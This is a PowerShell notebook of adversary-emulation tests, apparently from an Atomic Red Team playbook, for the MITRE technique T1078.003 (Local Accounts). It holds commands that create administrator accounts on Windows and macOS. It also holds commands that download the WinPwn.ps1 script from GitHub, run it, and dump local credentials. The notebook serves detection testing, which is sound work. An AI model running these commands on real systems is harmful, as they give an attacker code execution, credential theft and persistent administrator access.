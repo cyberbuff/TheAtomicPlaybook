{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9a365f66",
   "metadata": {},
   "source": "# T1078.003 - Local Accounts\nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. "
  },
  {
   "cell_type": "markdown",
   "id": "531258ba",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "31d8ec41",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create local account with admin privileges",
    "After execution the new account will be active and added to the Administrators group",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user art-test /add\nnet user art-test -4RTisCool!-321\nnet localgroup administrators art-test /add```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "498cca4d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "cda42100",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet localgroup administrators art-test /delete >nul 2>&1\nnet user art-test /delete >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9bf5baa6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f40ead7a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Create local account with admin privileges - MacOS",
    "After execution the new account will be active and added to the Administrators group",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ndscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fad0ffe5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "38bf27b3",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nsudo dscl . -delete /Users/AtomicUser```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96d382b2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6484837f",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - WinPwn - Loot local Credentials - powerhell kittie",
    "Loot local Credentials - powerhell kittie technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fdd1a0a1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "e78f5ce2",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - WinPwn - Loot local Credentials - Safetykatz",
    "Loot local Credentials - Safetykatz technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59e56bc0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1078.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "422d5d3f",
   "metadata": {},
   "source": "## Detection\nPerform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}